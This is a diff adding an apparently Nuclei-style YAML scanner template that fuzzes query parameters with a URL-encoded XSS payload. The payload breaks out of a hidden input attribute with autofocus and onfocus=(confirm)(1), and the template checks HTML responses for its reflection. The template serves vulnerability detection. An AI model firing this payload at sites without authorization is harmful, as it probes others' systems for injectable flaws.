@@ -1,0 +1,39 @@
+id: fuzz-hidden-input-xss
+
+info:
+  name: Hidden Input Reflection XSS Detection
+  author: netbaan
+  severity: medium
+  description: |
+    This template is designed to detect XSS vulnerabilities by injecting a payload into hidden input fields using autofocus and onfocus event handlers.
+
+http:
+  - pre-condition:
+      - type: dsl
+        dsl:
+          - 'method == "GET"'  # Run only on GET requests
+
+    payloads:
+      xss:
+        - "<input type=\"hidden\" value=\\\"mypayload\\\" /> %22%20autofocus%20onfocus%3d(confirm)(1)%2f%2f"
+
+    stop-at-first-match: true
+
+    fuzzing:
+      - part: query
+        type: replace
+        mode: single
+        fuzz:
+          - "{{xss}}"
+
+    matchers-condition: and
+    matchers:
+      - type: word
+        part: body
+        words:
+          - "onfocus=confirm(1)//"
+
+      - type: word
+        part: header
+        words:
+          - "text/html"
